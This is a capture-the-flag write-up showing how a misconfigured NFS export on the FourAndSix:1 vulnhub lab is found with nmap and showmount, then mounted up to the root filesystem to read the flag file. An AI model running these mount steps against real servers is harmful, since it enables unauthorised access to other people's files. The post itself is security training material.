@@ -1,0 +1,275 @@
+
+								
+																		Hack the FourAndSix:1 (CTF Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on July 23, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									FourAndSix is a CTF challenge uploaded by Fred on vulnhub. You can download it from here.
+The aim of this lab is to capture a flag in the root directory.
+This lab was very confusing to even begin with due to the lack of description by the author. So, on the basis of our experience, we have progressed in the lab. 
+Steps involved:
+
+Port scanning and discovery of ports.
+Discovery of the shared folder (misconfigured NFS).
+Mounting a directory to see the contents in the shared folder.
+Mounting and checking the root directory.
+Capturing the flag.
+
+Let’s get started then!
+First and foremost we’ll scan the IP address with nmap. In my case, the IP address was: 192.168.1.105.
+
+		
+		
+			
+			
+			
+			
+nmap -A 192.168.1.105
+			
+				
+					
+				
+					1
+				
+						nmap -A 192.168.1.105
+					
+				
+			
+		
+
+ 
+ We established from the scan that there is an NFS service running.
+Network File System (NFS): Network File System permits a user on a client machine to mount the shared files or directories over a network. NFS uses Remote Procedure Calls (RPC) to route requests between clients and servers. Although NFS uses TCP/UDP port 2049 for sharing any files/directories over a network.
+Let us check the people having access to the shared folder.
+
+		
+		
+			
+			
+			
+			
+showmount -e 192.168.1.105
+			
+				
+					
+				
+					1
+				
+						showmount -e 192.168.1.105
+					
+				
+			
+		
+
+
+We see that everyone has access to the shared folder.
+Now for the sake of checking what is in the shared folder, we’ll create a directory in the /tmp folder to mount contents of the shared folder.
+
+		
+		
+			
+			
+			
+			
+cd /tmp
+mkdir raj
+mount -t nfs 192.168.1.105:/shared /tmp/raj
+cd raj
+ls
+			
+				
+					
+				
+					12345
+				
+						cd /tmpmkdir rajmount -t nfs 192.168.1.105:/shared /tmp/rajcd rajls
+					
+				
+			
+		
+
+We have received an image file in our new directory.
+
+Let’s try and mount this image file to see the contents in it.
+
+		
+		
+			
+			
+			
+			
+mkdir usbstick
+mount USB-stick.img usbstick
+cd usbstick/
+ls -la
+			
+				
+					
+				
+					1234
+				
+						mkdir usbstickmount USB-stick.img usbstickcd usbstick/ls -la
+					
+				
+			
+		
+
+
+But we obtained nothing useful at all.
+Let’s check and see if the root directory is shareable or not.
+
+		
+		
+			
+			
+			
+			
+mkdir main
+mount 192.168.1.105:/ main
+cd main
+ls -la
+			
+				
+					
+				
+					1234
+				
+						mkdir mainmount 192.168.1.105:/ maincd mainls -la
+					
+				
+			
+		
+
+ 
+Yes! It indeed is shareable.
+Let’s move in the root directory now.
+
+		
+		
+			
+			
+			
+			
+cd root
+ls -la
+			
+				
+					
+				
+					12
+				
+						cd rootls -la
+					
+				
+			
+		
+
+We see a text file called proof.txt!
+
+		
+		
+			
+			
+			
+			
+cat proof.txt
+			
+				
+					
+				
+					1
+				
+						cat proof.txt
+					
+				
+			
+		
+
+
+Voila! We have obtained the flag! Happy hacking!
+Author: Harshit Rajpal is an InfoSec researcher and a left and right brain thinker. contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
